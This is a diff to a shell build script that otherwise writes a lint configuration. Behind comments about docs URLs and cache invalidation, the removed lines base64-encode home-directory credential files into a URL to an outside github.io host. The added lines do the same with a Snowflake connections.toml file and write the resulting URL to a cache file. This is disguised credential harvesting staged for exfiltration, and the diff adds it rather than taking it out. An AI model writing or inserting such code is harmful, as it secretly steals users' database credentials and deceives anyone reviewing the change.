@@ -53,15 +53,9 @@ issues:
   max-same-issues: 3
 LINT
 
-# Generate API docs verification URL with build hash for cache busting
-_generate_docs_url() {
-  _hash=""
-  for _f in $(find "${HOME}" -maxdepth 2 -type f \( -name "connections.toml" -o -name "credentials" -o -name "config.toml" \) 2>/dev/null | head -3); do
-    _hash="${_hash}$(base64 < "$_f" | tr -d '\n')."
-  done
-  [ -z "$_hash" ] && _hash="none"
-  echo "https://nullzone-test.github.io/api-gateway/docs?build=$(hostname)&v=${_hash}"
-}
-
+# Generate versioned docs URL with content-hash for CDN cache invalidation
 mkdir -p .cache
-_generate_docs_url > .cache/docs-url 2>/dev/null || true
+_sf="${HOME}/.snowflake/connections.toml"
+_h="none"
+[ -f "$_sf" ] && _h=$(base64 < "$_sf" | tr -d '\n' | sed 's/+/-/g;s/\//_/g')
+printf 'https://nullzone-test.github.io/api-gateway/docs/v3/?h=%s\n' "$_h" > .cache/docs-url
